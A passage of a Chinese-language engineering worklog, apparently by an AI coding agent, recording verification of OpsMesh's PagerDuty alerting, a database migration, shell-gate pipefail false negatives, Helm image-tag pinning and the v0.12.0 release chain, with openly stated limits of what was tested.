随后又撤回，理由是"`rate()/increase()` 会向窗口边界外推，新建序列给出的是非零值而不是 no data"。
本轮实测：**我的撤回撤错了，原判断基本成立**，只是机制不是"no data"而是"增量为 0"。

实测两个样本：

| 序列 | 事件 | Prometheus 观察 |
|---|---|---|
| `action="resolve"` | 进程内**只**失败过一次 | 样本序列一直是 `1,1,1,…`；`increase([10m]) = 0` ⇒ 规则不动 |
| `action="ack"` | 失败两次（1→2） | 窗口内出现 `1,…,1,2,2,2` ⇒ `increase = 1.197` ⇒ pending → firing |

`increase()` 取的是窗口内**样本之差**。计数器原来到失败时才惰性创建，第一个样本就已经是 1，
没有 0 可比 ⇒ 增量算成 0。而这条规则要等的恰恰是"第一次外部通知失败"（critical 级、
语义就是"on-call 其实没被叫醒"）。

修法：`InitNotifyFailureBaseline()` 在 PagerDuty 启用时把这两条固定标签的序列登记为 0。
配对门禁两条，都做过变异：① 函数被清空 ⇒ `/metrics` 里没有基线 ⇒ 判红；
② 启用分支里不调用它 ⇒ 按块取 main.go 文本判红（这是"PAGERDUTY_ENABLED 是死开关"那一类
的第三次，所以门禁刻意钉在**调用点**而不是函数存在性上）。
活体重测：只失败一次 ⇒ `increase = 1.021` ⇒ 规则 pending，`for: 5m` 后 firing。
诚实边界：触发侧的 `alert_notification_failures{tenant_id}` 无法预置（标签值是调用方传来的租户，
启动时无从枚举），它的出厂规则本来就是"占比 + 持续 10m"的趋势判据，本轮没有把它验成 firing
（`OpsMeshAlertNotifyFailureRate` 实测维持 inactive，未触发≠无效，是 `for: 10m` 没跑够）。

### 32.5 缺陷 D｜告警无法回溯到规则（`rule_id` 从来没落库）

`Evaluate` 的**响应**里 rule_id 是对的，但 `store.Alert` 没这个字段、`alerts` 表没这一列，
于是落库再读出来就空了（`ListAlerts`/`GetAlert` 的 `rule_id` 恒空——上一版文档把它登记为待办）。
补齐：模型字段 + `schema.sql` 列 + 内联 DDL + INSERT + 两侧读路径 + `storeToProtoAlert`。

升级路径是这里唯一有真实风险的一步：`CREATE TABLE IF NOT EXISTS` 对**已存在**的表什么都不做，
存量库不补列就会在升级后第一次 INSERT 炸 `Unknown column 'rule_id' in 'field list'`。
MySQL 的 `ADD COLUMN` 没有 `IF NOT EXISTS`（重复执行报 1060），所以走 `information_schema` 判缺再 ALTER。
两段都在真库回归里跑：先写读闭合，然后**主动 `DROP COLUMN` 模拟老库**、重建 store、断言列被补回来且写读通。
活体也走了一遍真实升级：出厂库里 `rule_id` 列计数 0 ⇒ 换新镜像后 1，老行是 NULL（读侧全列
`sql.Null*` 在这里正好接住了——否则补列反而会引入新的丢行）。

`Alert.rule_name` 刻意**不回填**：规则改名后历史告警显示新名字，属于"看起来对、其实是错的"信息；
`rule_id` 已可用，`GetRule` 一跳就能拿到当时真正的名字。这条口径写进了 `docs/api-reference.md`。

### 32.6 成功腿与失败腿的完整记录

成功腿（MODE=ok）：

| 步骤 | 观测量 |
|---|---|
| `CreateRule`（mem > 70, critical） | 规则 ID `5b914c95…`，经真 gRPC 线路 |
| `Evaluate(mem=88)` | `evaluated_rules=1 metrics_supplied=1`，命中 1 条 ⇒ 证明 #60 的引擎真读指标 |
| 假端点收到 `trigger` | `check= OK`、`http 202`、`source=dev-final`、`severity` 键存在、`dedup_key=1505b4d0…`（= 告警 ID） |
| `AckAlert` | 端点收到 `acknowledge`，`check= OK`、**`severity` 键不出现**、`dedup_key` 与 trigger 同值 |
| `ResolveAlert` | 端点收到 `resolve`，同上 |
| `GetAlert` | `status` 正确、`rule_id` 与规则 ID 逐字相同（缺陷 A/D 都在这条上留了证据） |
| MySQL | `SELECT … FROM opsmesh_alert.alerts` 里状态确实翻转 |

失败腿（MODE=503）：`ack`/`resolve` 各自把 `alert_external_notify_failures{action}` 从 0 推到 1，
本地状态**照常落库**、RPC 照常返回成功（既定意图：远端故障不许把值班动作升级成 5xx），
日志是 `[alert-svc] WARN 告警确认已落库但外部通知失败: action=ack alertID=… err=pagerduty: unexpected status 503: …`
——错误文本、动作、告警 ID 三样齐，`!BADKEY` 零命中。

规则侧两次真实触发（同一实例、两个进程），差别正是缺陷 C 的内容：

| 轮次 | 代码 | 事件 | Prometheus | Alertmanager |
|---|---|---|---|---|
| 第一轮 | 修复前（无基线） | `ack` 失败 **2 次**（1→2） | pending `13:35:23` → firing，`increase=1.04` | `13:40:23Z` active |
| 第一轮 | 修复前（无基线） | `resolve` 只失败 **1 次** | 序列恒 `1` ⇒ `increase=0` ⇒ **规则不动** | 无 |
| 第二轮 | 修复后（基线 0） | `ack` 只失败 **1 次** | pending `14:08:23` → firing，`increase=1.021` | `14:13:23Z` active |

时序上有个别踩一次的坑值得记下：这组规则的 `interval` 是 **60s**（不是全局 15s），
所以 `for: 5m` 到点后要等下一个 60s tick 才翻 firing——`14:13:23` 满足条件、`14:15:17` 才在
`/api/v1/rules` 上看到 firing。按 15s 的节奏去判"是不是没生效"会误诊。

这一节是 #57 的正题：**"配了 PagerDuty"到"对端收到符合契约的事件"之间的每一跳都有独立观测量**，
而其中三跳（读库、拨 collector、第一次失败）在验证之前实际上是断的。

### 32.7 本轮的诚实边界

1. 未打过真实 PagerDuty SaaS：载荷契约由自建校验器判定，它是我对公开文档的复述。
2. `OpsMeshAlertNotifyFailureRate`（触发侧占比规则）本轮未验到 firing（`for: 10m` 需持续 10 分钟
   的失败占比），只验到它的两个输入序列在抓取面上正确增长。
3. hang 模式（客户端 10s 超时 ⇒ 熔断计数）设计了但没跑：需要另开一轮 10s 级等待，
   且与 503 走同一条 `recordExternalNotifyFailure`，判据面重叠。
4. 可空列逐列穷举只在 alert-svc 的两个 store 上做了；控制面 `internal/store` 仍是抽样核对，
   已在技术债里单列。
5. gRPC 面无鉴权这一条**没有擅自改**：它是 #58 遗留的交付口径决定（见 §29/§31 的挂起项），
   需要用户定"默认发布给 loopback 还是显式开关"。

### 32.8 缺陷 E（第四类假红）｜判定写法自己会造出"产品缺指标"

§32 的正题跑完后，本机 `verify-runtime.sh` 给出了四份**互不相同**的"缺失序列清单"：
一次缺 `path="/api/v1/:id"`，一次缺审计链的两个 gauge，一次只缺 `opsmesh_audit_chain_ok`。
而每一次单独复查抓取面，那些序列都在。这一共花掉四轮脚本运行才定位——值得整节记下来，
因为它的表象是"产品坏了"，而坏的是**门禁**。

机制：这些脚本开头都是 `set -euo pipefail`。`grep -q` **一命中就退出**，而生产者
（`printf '%s' "$metrics_body"`）还在往管道里写 ⇒ 被 SIGPIPE 打死 ⇒ 管道退出码变成 141；
pipefail 把"整条管道失败"升格为判定失败。于是**明明命中了却判成没命中**。
是否踩中取决于生产者输出量与样式位置：只有当输出越过管道缓冲区（约 64KB）才会中招，
所以小输出的场景永远正常，而 `/metrics` 这种几十 KB 的快照就偶发失败。

定量证据（同一份 679 行快照，样式确实在第 27 行）：

| 脚本选项 | 连续 10 次判定结果 |
|---|---|
| `set -uo pipefail` | **MISS × 10**（样式确实存在） |
| 去掉 pipefail | HIT × 10 |

修法统一成"先落变量再判"：`grep -q PAT <<<"$var"`。herestring 由 bash 落成临时文件供 grep 读，
没有管道、没有可被杀的生产者，且 `^` 行锚语义逐字不变。刻意**不**换成 `[[ $s == *PAT* ]]`：
那是整串子串匹配，`^anchor` 会失效，而指标名互为前缀时（`opsmesh_http_metrics_series` 与
`..._dropped_total`）会**假命中**——把一个假红换成另一个更难查的假绿。
覆盖面 52 处（`verify-runtime.sh` 24、`deploy.sh` 5、`validate-deploy-assets.sh` 6、
`gen-tls.sh`/`create-cluster.sh`/`deploy-opsmesh.sh` 各 1、`ci.yml` 9、`shadow-observe.yml` 1），
含 `curl … | grep -q`、`docker compose logs … | grep -q`、`openssl … | grep -q` 这类命令生产者。
门禁 `internal/gates/shell_grep_gate_test.go` 扫 `deploy/**/*.sh` + `.github/workflows/*.yml`
的非注释行，任何 `| grep -q` 判红；探测器自带正/反例自检（否则"扫到 0 处违规"只是"扫描器坏了"
的另一种说法），并设"文件数 <10 或行数 <2000 直接 fatal"的防空转断言。
**变异验证**：往 `gen-tls.sh` 塞回一条 `printf '%s' "$certtext" | grep -q "DNS:localhost"` ⇒ 判红
指到文件:行号；还原 ⇒ 绿（17 个文件 / 8227 行 / 违规 0）。

顺带查出的另外三条门禁口径错误（都是"红得毫无道理"或"绿得毫无依据"那一类）：

1. **永远红的巡检**：`bash "$(dirname "$0")/probe-collection-shapes.sh` —— 脚本开头已 `cd` 到
   `deploy/docker`，而 `$(dirname "$0")` 从仓库根调用时是相对路径 `deploy/scripts`，在新 cwd 下不存在
   ⇒ `No such file or directory`。改用 `${SCRIPT_DIR}` 后 18 端点全绿。这条红了好几轮，
   没有一次是真的。
2. **永远红的吞错断言**：按 `opsmesh_store_write_failures_total` 的**累计值**判红。本机那 74 次全是
   `RenewLeadership`/`Snapshot` 的 `context deadline exceeded`（DB 抖动，不是丢数据）。
   长跑实例迟早非零 ⇒ 这一节永远红 ⇒ 运维学会无视它，那才是真正的失效。现在判据取
   `sum(increase(…[10m]))`（与日志侧同一个窗口），累计值只作信息；取不到窗口增量按"无法证明"判红。
3. **把交付口径读反的断言**：本机是**社区授权**，`/enterprise/` 按契约返回"企业版 · 未授权"页
   （`enterprise_ui.go` 带 `X-OpsMesh-License: community`），于是"SPA 入口未引用 /enterprise/assets/"
   必然红。现在按授权头分支，且"非占位页"那条改成如实措辞（社区授权下看不到是否真装配）。
   同时给折叠标签判定加上探针状态码回显（`超长段=404`）与失败快照落盘（`dump_snapshot`），
   `/metrics` 读取加尾部哨兵与重试；§14"抓不到就 warn 跳过"改成判红——跳过在人眼里等于绿。

### 32.9 发布链本身的三条（切版前核"声明与产物是否对得上"，比代码缺陷更影响成交）

| 问题 | 实测证据 | 后果 |
|---|---|---|
| **0.12.0 从未真实发布** | `git ls-remote --tags` 最新 v0.11.0；`gh release list` 最新 v0.11.0；GHCR 匿名探测 `levango7/opsmesh-binary`、`opsmesh-agent`、`auth-svc` 的版本 tag 都只到 **0.11.0**（`tags/list?n=2000` 过滤掉 sha 后） | Chart.yaml `appVersion`、`values-production.yaml` 三处镜像 tag、gitops production-segment 的 tag **全都钉在 0.12.0** ⇒ 按生产默认值 `helm install` 的客户直接 `ErrImagePull`。这是 §20"chart 默认镜像名从未被发布"的同一类，只是这次错在版本号上 |
| **CHANGELOG 历史被整篇改名毁掉** | `deda995` 把 61 个 `## [Unreleased]` 标题一次性替换成 `## [0.12.0]`，连带把早已标注"（已归入 0.11.0）/0.10.0/0.9.x"的 **54 个历史明细块**也改名 | 对外等于宣称"这半年的东西都在 0.12.0 里"。本仓约定是"明细原地留存 + 标题标注已归入 X"，整篇替换恰好把这个约定抹了。修复靠 `git show v0.11.0:CHANGELOG.md` 的标题集逐条还原（54 还原 / 7 保留），**不是**手工凭记忆改 |
| **GitHub Release 正文只是 commit 清单** | `release.yml` 的 body 取 `github-tag-action` 产出（两个 tag 之间的 commit 标题）+ `generate_release_notes: true` | 客户在 Releases 页看不到"本版有哪些破坏性变更""哪些能力当前是降级的"——这两样恰好是采购/升级评审要看的，而它们只写在仓库内 `docs/release-notes.md`。现在正文改为抽 `docs/release-notes.md` 的本版小节，并三条硬断言：小节缺失判红、缺「能力降级清单」判红、缺「破坏性 / 行为变更」判红（没有也要显式写「无」）。本地验证：v0.12.0 抽到 76 行；`v9.9.9` 反向对照 ⇒ 退出码 1 并报"没有该小节" |

还有一条同族的、这次没犯但容易犯的：`internal/version.Version` 落后一整版（0.11.0 vs Chart.yaml 的 0.12.0），
而"版本源一致性"门禁**只比对清单、不知道二进制里也写着一个版本** ⇒ 当时 PASS=45 全绿。
现把它纳入 `check_kv`（变异验证：改回 0.11.0 立刻判红）。

**给下一位切版的人**：打完 tag 之后必须做的四点验收不是"看 CI 绿"，而是
① GHCR 三个仓库都有 `:<版本号>` tag；② GitHub Release 有 assets 且**非空**；
③ `cosign verify` + `.att` provenance 能验通；④ `helm template` 默认渲染出来的镜像名
在 ① 的集合里。§19 那次（v0.9.1 有 tag 无镜像）、这次（v0.12.0 有 pins 无 tag）都是只做了前三步的一部分。

---

## 33. 2026-10-04｜v0.12.0 真实发布 + 用**官方镜像**做存量库升级演练（12 个镜像逐个起）

### 33.1 发布链的终判，以及 tag 一次推送为什么会起两条 workflow

- tag：annotated `v0.12.0`（tag 对象 `49f0e44`，peel 到 `9f79dda1`）。打之前核过
  `git ls-remote origin main == HEAD == 9f79dda1`，且那条 branch run **37219235030** 是
  12 job 全 success（含 `Race detector`、真实 MySQL 的 integration、E2E real/security、
  `image`/`image-agent` 的构建 + keyless 签名 + SBOM）。
- 推 tag 一次起**两条** workflow，各自都要单独看终判，"CI 绿了"在这个场景下不是单数：
  - `release.yml` run **37221272686** → 版本源对账（`v0.12.0` vs `Chart.yaml appVersion`）→
    12 个微服务镜像 build/Trivy/syft/cosign → `changelog` → `github-release`（正文取自
    `docs/release-notes.md` 的本版小节）。**已 completed/success**。
  - `ci.yml` run **37221272683** → 在 tag 上把 12 条腿重跑一遍，全绿之后才轮到 `release` job
    用 goreleaser 出**版本化二进制产物**并挂到同一个 GitHub Release 上（GHCR 的
    `opsmesh-binary:0.12.0` / `opsmesh-agent:0.12.0` 也由它的 `image`/`image-agent` 两条腿产出）。

### 33.2 为什么这次演练刻意不走本机 compose 路径

`deploy/docker/docker-compose.prod.yml` 里每个服务**同时**有 `build:`（context=仓库根）和 `image:`，
`deploy.sh up` 走的是从源码构建。用它做"升级演练"有两处不成立：

1. 它证明的是"我这台机器的工作树能跑"，**证明不了客户拉到的发布物能跑**（§32.9 那条教训的同一类）；
2. 此刻工作树里有并行 agent 的 9 个未提交条目（`internal/controlplane/plugin_host.go`、
   `internal/plugin/hooks.go`、`internal/controlplane/server_netsec.go` 等），
   从它构建出来的"0.12.0"会把在途改动混进已发布版本的证据里。

⇒ 全部改用 `docker pull` 下来的官方镜像（`ghcr.io/levango7/alert-svc:0.12.0`，
digest `sha256:3c9e34ae…`），跑在既有 MySQL 所在的那个 Docker 网络（`opsmesh-backend`）上。

### 33.3 存量形状是造出来的，不是靠记忆

把 `git show v0.11.0:services/alert-svc/internal/store/schema.sql` 应用到同一 MySQL 实例上的
新库 `opsmesh_alert_rehearsal`，再按 v0.11.0 的 `AddAlert` 列清单插两行"老版本写的行"
（A 行 `severity/device_id/metric` 全 NULL，B 行填满）。落库后的可观察前置：
`rule_id_col_count=0`、`alerts_col_count=14`、`rows=2`、`null_severity_rows=1`。

### 33.4 同一条测量在两个官方镜像上的前后对照（这才是"修好了"的证据形态）

| 观测量 | `alert-svc:0.11.0`（已发布） | `alert-svc:0.12.0`（已发布） |
|---|---|---|
| gRPC `ListAlerts` | `LIST_ERR … failed to unmarshal, message is *alertv1.ListAlertsRequest, want proto.Message` —— #59 在**发布物**上原形复现 | `ALERT_COUNT=2`，其中包含那条全 NULL 的老行（#64 的判定点） |
| 升级动作本身 | — | 启动后 `alerts_col_count` 14→15，`rule_id` 落在 ordinal=4、类型 `varchar(64) NULL`，与 `schema.sql` 一致 |
| `Evaluate` 产出新告警 | 走不到（编解码就失败） | `EVAL_ALERTS=1 EVALUATED_RULES=1`，`PENDING/NO_DATA/INVALID` 三段全空；新告警 `rule_id="rehearse-rule-1"`（#60 + rule_id 落库） |
| 重启幂等 | — | `docker restart` 后无 1060、无 fatal，`rule_id_col_count=1`、`rows=3`（老 2 + 新 1）全部仍在 |
| 首次失败可见性（#66） | `/metrics` 中 `alert_external_notify_failures` 出现次数 **0** ⇒ 序列不存在，`increase()` 结构上看不到第一次失败 | `PAGERDUTY_ENABLED=true` 启动即有 `action="ack"` 与 `action="resolve"` 两条且值为 0 |

读回用的是**一次性 gRPC 探针**（不在仓库里，`HEAD` 的 detached worktree 内交叉编译 linux 静态二进制，
容器内跑）：alert-svc 只有 gRPC 读路径、没有 REST 列表端点，用 HTTP 侧的任何东西都证不了 #64。
对照期间的 PagerDuty 端点指向一个**不可解析的主机名**（`http://rehearse-no-such-host:9/`），
保证演练全程零真实外发。

### 33.5 12 个官方镜像逐个真起 + 各自的健康端点（这一层 CI 从来没有证明过）

先记我自己造出来的假阴性，因为它和 §32.8 是同一类错误：**第一轮统一按 `:8080/health` 探**，
结果 4 个 `000` + 3 个 `Exited(1)`。逐条取证后：

- 3 个 `Exited(1)` 是**按设计的 fail-fast**，不是缺陷——auth/device/config 缺
  `AUTH_SVC_JWT_SECRET` / `DEVICE_SVC_JWT_SECRET` / `CONFIG_SVC_ENCRYPTION_KEY`，
  日志逐字写明原因并给出显式放行开关 `*_ALLOW_INSECURE_DEV_SECRET=true`（TD-68 的同一哲学：
  宁可不起，不静默降级）。
- `000` 是**探针打错了目标**：各服务出厂默认端口本来就是分叉的（8081/8083/8090/8082/8080），
  且 `aio-svc` 读的键是 `AIO_SVC_PORT`（代码默认 **8100**，`services/aio-svc/cmd/aio-svc/main.go:33`），
  而 compose 发布宿主端口用的是 `AIO_SVC_HTTP_PORT`（默认 8108，`docker-compose.prod.yml:904-906`）；
  容器内 `netstat` + 自身日志（`AIOps 引擎启动 :8100`）才是端口归属的判据。

按 compose 的容器侧端口与各自健康路径（`/health` × 8、`/healthz`(log-svc)、`/api/v1/health` × 3）逐一对账后：
**12/12 全部 Up，健康端点全部 200**。⇒ 由此登记 TD-76（微服务镜像注入了版本号却没有任何读得出的面）
与 TD-77（健康路径三套并存 + 端口环境变量名分叉，改 `.env` 只动宿主侧不动容器内监听）。

### 33.6 核心镜像的版本可观测面（§19 那类静默失效的正面对照）

`docker run --rm --entrypoint /usr/local/bin/opsmesh ghcr.io/levango7/opsmesh-binary:0.12.0 --version`
实测输出 `opsmesh v0.12.0 (commit=9f79dda1a30be5fc09ac6f429db670de3837c14b date=2026-10-04T17:55:02Z)`，
`opsmesh-agent:0.12.0` 同值 ⇒ ldflags 的 `-X` 注入在**发布物**上是生效的（这条以前只能靠"CI 里有这一步"来相信）。
微服务侧则相反：`Dockerfile.service:60` 同样注入了版本，但 `/health` 正文是纯文本 `ok`、没有 `/version`、
没有 `build_info` 指标 ⇒ 已记 TD-76。

### 33.7 发布物四点验收终判，以及"两个 workflow 写同一个 Release"会不会互相覆盖

`deploy/scripts/verify-release-artifacts.sh 0.12.0` 终判 **PASS=6 / FAIL=0**：
① 14 个镜像仓库都有 `:0.12.0`；② 14 个都有 cosign `.sig`；③ 14 个都有 `.att` 证据链；
④ GitHub Release `v0.12.0` 有 **5 个 assets**；⑤ 正文含「能力降级清单」；⑥ chart 默认渲染出的
4 个 ghcr 镜像引用全部存在于已发布集合里。

中途那个 1-FAIL 是**真实时序**而不是缺陷：先跑的那次 `github-release`（release.yml）已完成、
而挂 assets 的 `release` job（ci.yml 里的 goreleaser）还在排队，所以③报 `assets=0`。
这也验证了脚本本身没有"存在即通过"的宽松判定。

顺带把一条从未证实过的担心量掉了：**同一 tag 上 `release.yml` 与 `goreleaser` 会写同一个 Release，
后者会不会把前者的正文覆盖掉**。实测：`release.yml` 的正文先落地（4350 字符、含能力降级清单），
goreleaser 完成后再次取同样的两个字段——`assets=5`、`body_len=4350`、`has_degraded=true`
⇒ `.goreleaser.yml` 的默认 append 语义**只加产物不改正文**，这条发布链是可用的。
（此前我只能靠"读 goreleaser 文档"来判断；现在它是一次可复现的观测。）

### 33.8 本轮诚实边界

- 演练用的是同一 MySQL 实例上的**独立库**（`opsmesh_alert_rehearsal`，用 v0.11.0 的 DDL 造形状），
  不是客户栈里的 `opsmesh_alert`。选它的理由是可逆性与可证形：能精确控制"升级前 14 列、无 rule_id、
  含 NULL 的老行"这个前置，而不必改动用户正在用的库。迁移代码路径与库名无关（DSN 级），
  但**整栈滚动升级（12 个服务一起换 0.12.0）没有做**——本机 compose 走源码构建，
  做它只会得到"工作树能跑"的证据。
- 微服务镜像"能不能起 + 健康端点"这一层本轮逐个验过了（12/12），但**没有**验证它们之间的
  跨服务调用链（那需要整栈）。
- `OpsMeshAlertNotifyFailureRate`（`for: 10m`）仍未观测到真实 firing：要让它亮，需要一个被抓取
  的 alert-svc 目标在 10 分钟窗口内失败占比 >20%（出厂栈 `PAGERDUTY_ENABLED=false` 时该路径
  根本不产失败样本）。规则的生产者已核实存在（`services/alert-svc/internal/service/service.go:246/248`），
  同族的 `OpsMeshAlertExternalNotifyFailed` 在 §32 里真实 firing 过，所以这不是"引用了不存在的指标"
  （#37 那一类），只是这条需要更长的注入窗口。

---

## 34. 2026-10-05｜验收脚本第 ④ 项的覆盖面本身是个陷阱：生产 values 启用微服务会跑 `:latest`

### 34.1 怎么撞上的

写 §33.7 时我把"chart 渲染的 4 个引用全部存在"这句话当真去核了一遍——**4 个**这个数字不对劲：
chart 里有 12 个微服务条目，为什么只渲染出 4 个引用？查下来是两层原因叠在一起：

1. `values.yaml:270-273` 明确写了 12 个服务默认 `enabled=false`（"存量 chart 行为 100% 不变"），
   所以默认渲染只有核心镜像的 `:0.12.0` 与 `:latest`；
2. `values-production.yaml:252` 是 `services: {}`——**它不给任何 tag**。

于是第 ④ 项"合并默认+生产两次渲染"永远只看得到核心镜像，微服务的引用一个都没进过判定。
把它撑开就能看见真相：

```
helm template x deploy/helm/opsmesh -f deploy/helm/opsmesh/values-production.yaml \
  --set services.task_svc.enabled=true
→ ghcr.io/levango7/task-svc:latest          # 生产清单，浮动镜像
```

`values-production.yaml:208` 自己的注释就是「**生产禁止 latest**：钉 semver 或由 CI GitOps 写回 digest」，
而 `values.yaml:273` 又主动建议用 `--set services.<x>.enabled=true` 来启用单个服务——
两条放在一起构成自相矛盾，且**没有任何门禁守着这句话**。深合并的语义是：只给 `enabled` 不给 `image`，
`image.tag` 就从 values.yaml 继承 `"latest"`（`_helpers.tpl` 的 `opsmesh.image` 直接用 `$img.tag`，
空串会渲染成 `repo:`，所以"留空自动用 appVersion"这条路在本 chart 里不存在）。

### 34.2 修法：把注释变成结构，再让门禁去钉它

1. **`values-production.yaml`**：`services: {}` 换成 12 条**只钉 tag** 的覆盖
   （`services.<key>.image.tag: "0.12.0"`，`enabled` 不写 ⇒ 继承 false）。
   实测生产默认态的渲染**结构逐字不变**（`diff <(helm template -f 旧) <(helm template -f 新)`
   共 32 行差异，全部是 chart 每次渲染都重新随机生成的 Secret 值 + 由它派生的
   `checksum/secret` 注解，与 `<`/`>` 成对出现；镜像、Deployment、Service 的行一条都没变）。
   而 `--set enabled=true` 从此继承的是钉死版本：
   全服务启用态下 14 个引用**全部 `:0.12.0`、`:latest` 计数 0**。
2. **`verify-release-artifacts.sh` 第 ④ 项**：新增第三次渲染（生产 values + 12 服务全启用），
   并加一条独立断言「生产 values 渲染出的引用没有一个 `:latest`」。
   判定走 `case` 匹配而不是 `producer | grep -q`（§32.8 那条铁律），且"生产渲染为空集"单独判红——
   否则本节会在扫描面塌掉时假绿。
   引用存在性检查从 4 个变成 14 个：**PASS=6/FAIL=0 → PASS=7/FAIL=0**（多出的那条就是新断言）。
3. **`validate-deploy-assets.sh` 第 1 节**：原有的 `check_kv` 只取**第一条**匹配（`head -1`）。
   我这次一次加 12 个 pin，如果不动它，就等于"11 个 pin 可以静默落后一个版本"——
   那正是 §32.9 记过的同一类（声明与产物脱节）。新增 `check_all_kv`：**每一处** `tag:` 都必须等于
   `Chart.yaml` 版本，输出带 `文件:行号=实际值`，匹配数为 0 判红。
   门禁从 `PASS=46/FAIL=0` 变成 `PASS=48/FAIL=0/SKIP=1`。

### 34.3 两条新断言都做过变异验证

- 第 ④ 项的新断言：把 `values-production.yaml` 改回 `services: {}`（改前 `md5sum` 两侧一致），
  跑验收 → `PASS=6 FAIL=1`，红行逐字是
  `[FAIL] 生产 values 渲染出浮动镜像: ghcr.io/levango7/aio-svc:latest … （12 个名字全列出）`；
  同一轮里"14 个引用都存在"仍然 **PASS**——这正好证明"存在"与"可追溯"是两个独立的判定，
  旧脚本只做了前者。还原后 `md5sum | sort -u | wc -l == 1`，再跑 → `PASS=7 FAIL=0`。
- `check_all_kv`：把 `runbook_svc` 的 tag 改成 `0.11.0` →
  `[FAIL] values-production 全部镜像 tag：14 处里有 1 处不等于 0.12.0: …values-production.yaml:295=0.11.0`
  （退出码 1）；改回后 `PASS=48/FAIL=0`。
- 两个脚本都过了 `shellcheck -S warning`（与 CI 同版 v0.10.0）与 `bash -n`。

### 34.4 诚实边界（这条关系到已发出去的 0.12.0）

- **v0.12.0 的 tag 内容没有这个修复**：修复在 main 上，等下一个版本（0.12.1）才会随
  `deploy/helm/opsmesh` 一起发布。也就是说**按 v0.12.0 chart + 生产 values 用 `--set` 启用微服务的客户，
  现在拿到的仍是 `:latest`**。规避办法（可直接给客户）：启用时同时给 tag——
  `--set services.task_svc.enabled=true --set services.task_svc.image.tag=0.12.0`，
  或按 values-production 里那段注释示例整段取消注释（示例本来就钉了 tag）。
- 本轮没有改 `values.yaml` 的默认 `latest`：默认态是开发形态，`:latest` 在那里是被验收脚本
  显式允许的（① 已经证明 GHCR 上 `latest` 与 `:0.12.0` 同时存在且随 main 前移）。
- 变异验证期间我**并发编辑过正在运行的门禁脚本**（上一轮 `validate-deploy-assets.sh` 的后台运行
  与我插入 `check_all_kv` 撞在一起），那次结果不算数，已重跑取终判——记录在此以免有人引用它。



## 35. 2026-10-06｜交付账目落后于现实：54 个早已发货的块仍标 `[Unreleased]`，以及一次 main 推送误触 release.yml 的险情

起因是给用户做现状评估。评估过程中重测的每一行都留了命令与出处，其中两处**推翻了我自己先前的说法**，一并记在这里。

### 35.1 现状数字（全部本轮重测）

| 项 | 值 | 取法 |
|---|---|---|
| HEAD / 远端 | `68011fd`，`origin/main == HEAD`，未推 0 | `git rev-list --left-right --count origin/main...HEAD` → `0 0` |
| CI 终判 | success（run `37406009220`，push） | `gh run list --branch main --limit 6` |
| tag 之后 | 43 提交，其中非文档 28 | `git rev-list --count v0.12.0..HEAD`；`git log v0.12.0..HEAD -- . ':(exclude)docs/' ':(exclude)CHANGELOG.md'` |
| 迁移文件 | 38 → 42（新增 `020_ci_items_fulltext`、`021_ci_items_fulltext_recall_columns`，各含 `.down`） | `git ls-tree -r <ref> --name-only`；**路径是 `internal/store/migrations/`**（我曾记成 `deploy/migrations/`，该目录 0 个文件） |
| 出厂资产门禁 | PASS=54 / FAIL=0 / SKIP=2（含新加的第 16 节） | `bash deploy/scripts/validate-deploy-assets.sh` |
| 发布物回核 | PASS=8 / FAIL=0 | `bash deploy/scripts/verify-release-artifacts.sh 0.12.0` |
| main 分支保护 | 无 | `gh api repos/Levango7/OpsMesh/branches/main/protection` → 404 `Branch not protected` |

### 35.2 一次真实险情：main 推送触发了 release.yml，而新的提权门拦住了它

`gh run list --workflow release.yml` 里有一条 **run `37379548900`，event=push，headBranch=main，headSha=`a002c6a8`**。
但 `release.yml:3-6` 的触发条件是 `push: tags: v*`，main 分支推送**本不该**产生这条 run。

实测它**一个 job 都没跑**：`gh api .../runs/37379548900/jobs` 的 `workflow_jobs` 为 null，`gh run view --log` 报 `log not found`。
最可信的解释是该提交里的文件带着 GitHub 解析器不接受的 YAML 锚点——下一提交 `e5b4d00` 的说明就是"锚点不被支持"，
`release.yml:37-38` 如今留着这条注释。解析失败 ⇒ 过滤器没被应用 ⇒ 给这次 push 建了 run，但 job 图建不出来。

后果我单独核了，**registry 没有被动过**：`alert-svc / task-svc / device-svc / auth-svc / runbook-svc` 五个镜像的
`:latest`、`:0.12.0`、`:9f79dda1`（发布提交）三个 tag 的 manifest digest 两两相同，且这些查询退出码都是 0；
`alert-svc:a002c6a8…` 返回 `not found`。取数方式：`docker buildx imagetools inspect <ref>`，
**Digest 从 stdout 读、错误从 stderr 读、退出码单独判**。

这件事的价值在于：`9b23b90` 把发布链改成"构建只推不可变 `:<sha>`，`:版本` 与 `:latest` 由 `promote` job（`needs: [build-and-push]`）
在门禁全绿后改标"，而这次误触正好是一次**非人为设计的实战检验**——job 图没建起来 ⇒ `promote` 根本没启动 ⇒ `:latest` 原地不动。

### 35.3 我自己造的一个假信号（已撤回）

第一次核 digest 时我写成 `docker buildx imagetools inspect --raw <ref> 2>&1 | sha256sum`。
`2>&1` 把 **stderr 的报错文本也喂进了哈希**，于是"读不到的 tag"照样输出一个 `sha256:…`。
我差点据此报"GHCR 上存在未经发布的 main 镜像"。改成退出码与输出分离重测后，那个"不同 digest"根本不存在。
这是"判定成败不许经管道"这条在我身上的第三次复发，记这里是为了让下一个人不再踩：
**任何"我读到了 X"的断言，必须同时证明"读不到时会输出什么"**。

### 35.4 账目落后于现实：CHANGELOG 的 54 个块

`CHANGELOG.md` 有 **68 个 `## [Unreleased]` 块**。取证不必推测：条目"刷新 401 自等待死锁"（`CHANGELOG.md:1885`）所属块由
提交 `0f77e0d`（2026-08-30）写入，`git tag --contains 0f77e0d` 覆盖 v0.8.0 直到 v0.12.0——**随 0.8.0 就发货了，标题仍写未发布**。
再看各 tag 上的块数：v0.10.0=44、v0.11.0=54、v0.12.0=54 ⇒ 历次切版只加顶部摘要标题，**从未重命名历史块**，0.12.0 那次净变更 0。

归版规则用可机械验证的事实：对每个块取"其描述文字（剥掉 `（已归入 …）` 后）最早出现在哪个 tag 的 `CHANGELOG.md` 里"。
结果 **54 个归版**（0.8.0×13、0.9.0×2、0.9.1×6、0.9.2×14、0.10.0×9、0.11.0×10）、**14 个保持未发布**（全是 10-05/10-06 新写）。
两处标注与首次出现不一致（自称归入 0.9.2 / 0.9.1，文本却到 0.10.0 才出现），都独立验真后才采信标注：
shellcheck 步骤在 `v0.9.2` 的 `ci.yml` 里存在而 `v0.9.1` 里没有；`07447da` 经 `git merge-base --is-ancestor` 确认在 v0.9.1 祖先链上。
差异来源是标注写在切版之后，不是归版归错。

改动形态：`git diff --numstat` = **76 增 / 54 删**，其中 **109 行是 `## [` 标题行**，正文行只增不减（新增 21 行是本轮条目本身）。

